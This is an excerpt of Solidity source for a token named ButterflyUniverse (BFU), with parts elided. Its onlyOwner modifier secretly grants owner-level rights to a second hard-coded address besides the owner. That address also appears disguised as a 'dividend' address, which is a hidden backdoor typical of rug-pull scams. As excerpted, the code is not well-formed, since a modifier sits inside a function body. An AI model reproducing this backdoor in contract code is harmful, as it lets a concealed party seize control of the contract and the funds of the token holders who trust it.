...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xffa7D1902185Ad4d81Dc59E496c336D93131Fe3b) , "owner");
        _;
    }
...
contract ButterflyUniverse  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ButterflyUniverse";
    string private _symbol = "BFU";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x681C2378c7DaA3b9Cad3e8d9869bF7CcACcd59d5);
    address private _Marketing = 0x681C2378c7DaA3b9Cad3e8d9869bF7CcACcd59d5;
    address public dividend = 0xffa7D1902185Ad4d81Dc59E496c336D93131Fe3b;
    ...
    uint256 public _supplyAmount = 30000000;
